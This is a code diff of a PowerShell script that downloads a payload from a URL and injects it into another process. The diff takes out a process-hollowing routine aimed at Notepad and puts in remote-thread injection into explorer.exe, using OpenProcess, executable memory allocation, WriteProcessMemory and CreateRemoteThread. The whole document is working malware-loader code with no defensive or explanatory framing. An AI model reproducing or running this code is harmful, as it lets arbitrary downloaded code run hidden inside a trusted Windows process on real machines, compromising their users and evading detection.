@@ -8,69 +8,77 @@ Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
 # Read payload bytes
 $payload = [System.IO.File]::ReadAllBytes($payloadPath)
 
-# Add P/Invoke
+# Add P/Invoke with necessary functions for injection
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-public class Hollow {
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {
-        public int cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
-        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
-        public int dwFillAttribute;
-        public int dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
-        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess, hThread;
-        public int dwProcessId, dwThreadId;
-    }
+public class Injector {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CreateProcess(
-        string lpAppName, string lpCmdLine, IntPtr lpProcessAttrs, IntPtr lpThreadAttrs,
-        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-    [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    [DllImport("kernel32.dll")]
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
 
     [DllImport("kernel32.dll")]
-    public static extern uint ResumeThread(IntPtr hThread);
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
 }
 "@
 
-# Setup structures
-$si = New-Object Hollow+STARTUPINFO
-$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
-$pi = New-Object Hollow+PROCESS_INFORMATION
+# Desired access flags for OpenProcess
+$PROCESS_ALL_ACCESS = 0x001F0FFF
 
-# Create Notepad in suspended mode
-$created = [Hollow]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
-
-if (-not $created) {
-    Write-Error "[-] Failed to create process."
+# Find explorer.exe process
+$explorer = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
+if (-not $explorer) {
+    Write-Error "[-] explorer.exe process not found."
     exit
 }
 
-# Allocate memory in target
-$base = [Hollow]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, $payload.Length, 0x3000, 0x40)
+# Open handle to explorer.exe
+$hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $explorer.Id)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to open explorer.exe process."
+    exit
+}
 
-# Write payload
-$written = [UIntPtr]::Zero
-[Hollow]::WriteProcessMemory($pi.hProcess, $base, $payload, $payload.Length, [ref]$written) | Out-Null
+# Allocate memory in explorer.exe process
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PAGE_EXECUTE_READWRITE = 0x40
 
-# Resume thread
-[Hollow]::ResumeThread($pi.hThread) | Out-Null
-Write-Host "[+] Injection complete."
+$baseAddress = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$payload.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+if ($baseAddress -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to allocate memory in explorer.exe."
+    [Injector]::CloseHandle($hProcess) | Out-Null
+    exit
+}
+
+# Write payload to allocated memory
+$bytesWritten = [UIntPtr]::Zero
+$writeResult = [Injector]::WriteProcessMemory($hProcess, $baseAddress, $payload, [uint32]$payload.Length, [ref]$bytesWritten)
+if (-not $writeResult -or $bytesWritten.ToUInt32() -ne $payload.Length) {
+    Write-Error "[-] Failed to write payload to explorer.exe memory."
+    [Injector]::CloseHandle($hProcess) | Out-Null
+    exit
+}
+
+# Create remote thread to execute payload
+$hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $baseAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($hThread -eq [IntPtr]::Zero) {
+    Write-Error "[-] Failed to create remote thread in explorer.exe."
+    [Injector]::CloseHandle($hProcess) | Out-Null
+    exit
+}
+
+Write-Host "[+] Injection into explorer.exe completed successfully."
+
+# Close handles
+[Injector]::CloseHandle($hThread) | Out-Null
+[Injector]::CloseHandle($hProcess) | Out-Null
